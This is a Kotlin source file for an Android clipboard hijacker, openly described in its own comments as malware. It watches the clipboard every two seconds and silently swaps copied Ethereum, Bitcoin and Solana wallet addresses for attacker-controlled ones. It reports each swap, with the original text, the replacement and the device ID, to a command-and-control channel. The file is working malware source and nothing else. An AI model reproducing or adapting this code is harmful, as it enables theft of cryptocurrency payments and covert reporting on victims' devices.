// ============================================================
// FILE: android/app/src/main/java/com/xrc/crypto/ClipboardSwapper.kt
// ============================================================
package com.xrc.crypto

import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.util.Log
import com.xrc.comms.ChannelClient
import com.xrc.comms.Message
import com.xrc.comms.Protocol
import com.xrc.core.crypto.Identity

/**
 * ClipboardSwapper — cryptocurrency address replacement.
 *
 * Monitors clipboard for cryptocurrency addresses and
 * replaces them with attacker-controlled addresses.
 *
 * This is a classic "clipboard hijacker" that silently
 * swaps wallet addresses when the user copies them.
 */
class ClipboardSwapper(
    private val context: Context,
    private val channelClient: ChannelClient
) {
    companion object {
        private const val TAG = "ClipboardSwapper"

        private val ETH_RE = Regex("""\b0x[a-fA-F0-9]{40}\b""")
        private val BTC_RE = Regex("""\b(bc1[a-z0-9]{38,59}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})\b""")
        private val SOL_RE = Regex("""\b[1-9A-HJ-NP-Za-km-z]{32,44}\b""")
    }

    private var isActive = false
    private var swapAddresses = mapOf(
        "ETH" to "0x0000000000000000000000000000000000000000",
        "BTC" to "bc1q000000000000000000000000000000000000000",
        "SOL" to "00000000000000000000000000000000000000000000"
    )

    /**
     * Enable clipboard swapping.
     */
    fun enable(attackerAddresses: Map<String, String>) {
        swapAddresses = swapAddresses + attackerAddresses
        isActive = true
        startMonitoring()
        Log.i(TAG, "Clipboard swapping enabled")
    }

    /**
     * Disable clipboard swapping.
     */
    fun disable() {
        isActive = false
        stopMonitoring()
        Log.i(TAG, "Clipboard swapping disabled")
    }

    /**
     * Check and swap clipboard content if it contains an address.
     * Called manually or via timer.
     */
    fun checkAndSwap() {
        if (!isActive) return

        try {
            val cm = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            val clip = cm.primaryClip ?: return
            if (clip.itemCount == 0) return

            val text = clip.getItemAt(0).text?.toString() ?: return
            val swapped = swapAddressesInText(text)

            if (swapped != text) {
                // Replace clipboard with swapped version
                val newClip = ClipData.newPlainText("text", swapped)
                cm.setPrimaryClip(newClip)

                Log.i(TAG, "Clipboard address swapped: $text -> $swapped")

                // Report to C2
                val deviceId = Identity.getDeviceId(context)
                val msg = Message(
                    type = Protocol.TYPE_SENSOR_DATA,
                    id = "swap_${System.currentTimeMillis()}",
                    device_id = deviceId,
                    payload = Protocol.json.encodeToString(
                        mapOf("type" to "clipboard_swap", "original" to text, "replaced" to swapped)
                    )
                )
                channelClient.send(msg)
            }
        } catch (e: Exception) {
            Log.w(TAG, "Clipboard swap failed: ${e.message}")
        }
    }

    /**
     * Replace known addresses in text with attacker addresses.
     */
    fun swapAddressesInText(text: String): String {
        var result = text

        // Replace ETH addresses
        result = ETH_RE.replace(result) { match ->
            swapAddresses["ETH"] ?: match.value
        }

        // Replace BTC addresses
        result = BTC_RE.replace(result) { match ->
            swapAddresses["BTC"] ?: match.value
        }

        // Replace SOL addresses
        result = SOL_RE.replace(result) { match ->
            if (match.value.length >= 32) {
                swapAddresses["SOL"] ?: match.value
            } else match.value
        }

        return result
    }

    /**
     * Set specific replacement addresses.
     */
    fun setReplacementAddresses(addresses: Map<String, String>) {
        swapAddresses = swapAddresses + addresses
    }

    /**
     * Get current replacement addresses.
     */
    fun getReplacementAddresses(): Map<String, String> = swapAddresses

    fun isActive(): Boolean = isActive

    private var monitorThread: Thread? = null
    private fun startMonitoring() {
        monitorThread = Thread {
            while (isActive) {
                checkAndSwap()
                try { Thread.sleep(2000) } catch (e: InterruptedException) { break }
            }
        }.apply { isDaemon = true; start() }
    }

    private fun stopMonitoring() {
        monitorThread?.interrupt()
        monitorThread = null
    }
}
